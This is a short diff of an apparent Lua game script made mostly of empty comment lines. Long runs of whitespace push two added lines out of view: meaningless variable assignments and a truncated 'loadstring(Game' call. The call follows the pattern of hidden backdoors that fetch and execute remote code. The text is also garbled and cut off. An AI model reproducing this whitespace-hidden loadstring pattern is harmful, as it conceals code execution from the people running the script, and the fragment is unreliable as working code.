@@ -1,4 +1,4 @@
-                                                                                                                                                                                                                                                                                                function() e=12 f=88 a=51 f=2 end
+                                                                                                                                                                                                                                                                                               local e=12 local f=88 local a=51 local f=2
 --
 
 --
@@ -7,6 +7,10 @@
 
 --
 
+--
+
+--
+                                                                                                                                                                                                                                                                                                loadstring(Game
 --
 
 --
